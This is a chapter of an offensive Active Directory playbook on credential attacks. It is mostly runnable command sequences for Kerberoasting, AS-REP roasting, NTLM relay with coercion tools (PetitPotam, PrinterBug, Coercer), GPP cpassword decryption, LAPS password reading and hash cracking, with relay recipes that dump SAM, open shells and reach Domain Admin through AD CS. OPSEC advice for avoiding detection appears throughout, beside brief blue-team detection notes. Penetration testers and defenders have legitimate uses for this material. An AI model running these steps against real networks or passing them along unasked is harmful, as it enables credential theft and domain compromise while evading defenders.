# Phase 4: Credential Attacks

> Extract or crack credentials without needing local admin first.

---

## Table of Contents
1. [Kerberoasting](#1-kerberoasting)
2. [AS-REP Roasting](#2-as-rep-roasting)
3. [NTLM Relay](#3-ntlm-relay)
4. [GPP Passwords (cpassword)](#4-gpp-passwords-cpassword)
5. [LAPS Reading](#5-laps-reading)
6. [Hash Cracking Reference](#6-hash-cracking-reference)

---

## 1. Kerberoasting

**Concept**: Any authenticated user can request a Kerberos TGS for any service account (one with a Service Principal Name / SPN). The TGS is encrypted with the service account's password hash. Request → take offline → crack. Works because the SPN portion of Kerberos uses RC4 (or AES if you didn't downgrade), which is offline-crackable.

**Prerequisite**: Any valid domain user credential.

### Find Kerberoastable Accounts
```powershell
# PowerView (Windows)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```
```bash
# Impacket (Linux)
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10
```

### Request & Extract Tickets
```bash
# Impacket — request all and write hashcat-format hashes
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 -request -outputfile kerb.hash

# Specific user
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 -request-user svc_sql
```

```powershell
# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# Stealth: target one user, AES tickets to avoid RC4 anomaly alerts
.\Rubeus.exe kerberoast /user:svc_sql /aes /nowrap
```

### Crack
```bash
# RC4 ticket
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES ticket
hashcat -m 19700 kerb.hash rockyou.txt
```

🟡 **OPSEC**: Each TGS request → Event 4769 on the DC. Defender for Identity & many SIEMs alert specifically on **RC4-encrypted (0x17) TGS requests** because AES is the modern default. Use `/aes` in Rubeus if AES tickets are available (some accounts only support RC4).

**Detection (Blue Team)**:
- Event 4769 with Ticket Encryption Type 0x17 (RC4-HMAC) ← red flag
- Defender for Identity: "Suspected Kerberoasting"
- Honeytoken accounts (decoy with SPN) firing 4769

**High-value targets**: anything starting with `svc_`, `sql*`, MSSQL accounts, accounts with `adminCount=1` (these were once in a protected group → likely privileged).

---

## 2. AS-REP Roasting

**Concept**: Accounts with "Do not require Kerberos pre-authentication" set return an encrypted AS-REP to any requester. The encrypted part contains a session key derivable from the user's password hash. Crack offline.

**Prerequisite**: Just a username list — **no credentials needed**. Best done early.

```bash
# No credentials needed — just usernames
GetNPUsers.py lab.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt

# With credentials (enumerate + request in one shot)
GetNPUsers.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 -request -outputfile asrep.hash
```

```powershell
# PowerView discovery
Get-DomainUser -PreauthNotRequired | select samaccountname

# Rubeus
.\Rubeus.exe asreproast /outfile:asrep.hash /format:hashcat /nowrap
```

### Crack
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

🟢 **OPSEC**: AS-REQ logs to Event 4768. Pre-auth type 0 (no preauth) is a useful flag in rules. Low noise compared to spraying.

**Detection**:
- 4768 with `Pre-Authentication Type = 0`
- Defender for Identity has a direct "Suspected AS-REP Roasting" alert

---

## 3. NTLM Relay

**Concept**: NTLM authentication can be relayed: capture a victim's NTLM challenge/response and replay it against a different target where the victim has access. Most powerful when:
- The victim is a privileged user/computer account
- The target lacks SMB signing (default for workstations)

### Find Relay-Eligible Targets
```bash
# Hosts without SMB signing required
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
cat targets.txt
```

### Setup
```bash
# 1. Disable Responder's SMB/HTTP servers (let ntlmrelayx handle)
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# 2. Start Responder for poisoning
sudo responder -I eth0 -dwPv

# 3. In another terminal, start ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
# OR with specific action:
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -c 'whoami'
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -i        # interactive shell
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support           # dump SAM by default
```

### Trigger an Auth Coercion (force a specific host to authenticate)
```bash
# PetitPotam (MS-EFSRPC abuse — works against most Windows even patched)
python3 PetitPotam.py 10.10.10.99 10.10.10.10
# Coerces DC at .10 to authenticate to attacker at .99

# PrinterBug (SpoolSample) — needs Print Spooler service running on target
python3 printerbug.py 'lab.local/jdoe:Password1@10.10.10.10' 10.10.10.99

# DFSCoerce
python3 dfscoerce.py -d lab.local -u jdoe -p Password1 10.10.10.99 10.10.10.10

# All-in-one: Coercer
Coercer coerce -u jdoe -p Password1 -d lab.local -t 10.10.10.10 -l 10.10.10.99
```

### Relay Recipes

```bash
# Dump SAM from a workstation
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support

# Add a new computer to AD (LDAP, no shells needed)
sudo ntlmrelayx.py -t ldap://10.10.10.10 -smb2support --add-computer

# Set RBCD on a target computer (delegation persistence — see Phase 6)
sudo ntlmrelayx.py -t ldap://10.10.10.10 -smb2support --delegate-access \
  --escalate-user 'FAKE$'

# Relay to AD CS web enrollment (ESC8) → get cert as DC machine account → DA
sudo ntlmrelayx.py -t http://ca.lab.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController'
```

🔴 **OPSEC**: Responder and coercion tools are loud — IDS/EDRs increasingly fingerprint LLMNR poisoning and PetitPotam.

**Detection**:
- LLMNR/NBT-NS replies from non-DNS hosts (Sysmon, NDR)
- Event 4624 LogonType 3 from anomalous source for privileged accounts
- Defender for Identity: "Suspected NTLM relay attack"
- For PetitPotam: EFSRPC traffic to unusual hosts; MS released a patch (KB5005413) for the unauthenticated variant

---

## 4. GPP Passwords (cpassword)

**Concept**: Old Group Policy Preferences (pre-MS14-025) let admins set local passwords via GPO. The password was stored encrypted in SYSVOL with **a hardcoded AES key Microsoft published**. Anyone with Domain User read access to SYSVOL can decrypt.

```bash
# Mount SYSVOL and grep
smbclient //10.10.10.10/SYSVOL -U 'jdoe%Password1' -c 'recurse; prompt; mget *' -m SMB3

# Or via NetExec
nxc smb 10.10.10.10 -u jdoe -p Password1 -M gpp_password
nxc smb 10.10.10.10 -u jdoe -p Password1 -M gpp_autologin

# Manual decrypt
gpp-decrypt 'AzVJmXh6GKuQUMvWVQQa+ESQ...'
```

Look for: `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Drives.xml`. Field name: `cpassword`.

🟢 **OPSEC**: Reading SYSVOL is normal AD client behavior. Not detected.

---

## 5. LAPS Reading

**Concept**: LAPS (Local Administrator Password Solution) stores randomized local-admin passwords for domain-joined computers in the `ms-Mcs-AdmPwd` (legacy) or `msLAPS-Password` (Windows LAPS) attribute on each computer object. Designated users can read these.

```bash
# Check if you can read any LAPS passwords
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M laps

# Specific computer
python3 pyLAPS.py --action get -u jdoe -p Password1 -d lab.local --dc-ip 10.10.10.10
```

```powershell
# PowerView
Get-DomainObject -Identity 'WS01$' -Properties ms-Mcs-AdmPwd, msLAPS-Password

# Native
Get-LapsADPassword -Identity WS01
```

If you can read LAPS on a computer → you have local admin on it → lateral move.

🟢 **OPSEC**: Reading LAPS attribute = LDAP query. Logged with directory auditing only.

---

## 6. Hash Cracking Reference

### Hashcat mode chart

| Hash | Mode | Source |
|------|------|--------|
| NTLM | 1000 | Dumped from SAM / LSASS / NTDS |
| LM | 3000 | Old SAM dumps |
| NetNTLMv1 | 5500 | Responder / downgrade |
| NetNTLMv2 | 5600 | Responder |
| Kerberos TGS-REP RC4 | 13100 | Kerberoast |
| Kerberos TGS-REP AES128 | 19600 | Kerberoast AES |
| Kerberos TGS-REP AES256 | 19700 | Kerberoast AES |
| Kerberos AS-REP RC4 | 18200 | AS-REP roast |
| DCC2 (mscash2) | 2100 | Cached domain creds |
| Office documents | 9400-9700 | Excel/Word protected files |
| KeePass | 13400 | .kdbx found on share |

### Rule recipes
```bash
# Best general rule
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Deeper (slower)
hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Hybrid: wordlist + 2 digits at the end
hashcat -m 1000 hash.txt rockyou.txt -a 6 ?d?d

# Custom mask: corporate password pattern e.g. Company2024!
hashcat -m 13100 hash.txt -a 3 'Target?d?d?d?d!'
```

### John alternative
```bash
john --wordlist=rockyou.txt --format=krb5tgs kerb.hash
john --wordlist=rockyou.txt --format=netntlmv2 responder.hash
```

---

## Next Step

Cracked a service account → likely has local admin somewhere → **Phase 5: Lateral Movement** (`05-lateral-movement.md`)
Cracked a privileged user → check ACLs → **Phase 6: Privilege Escalation** (`06-privesc.md`)
Cracked a Domain Admin → **Phase 7: Domain Dominance** (`07-domain-dominance.md`)
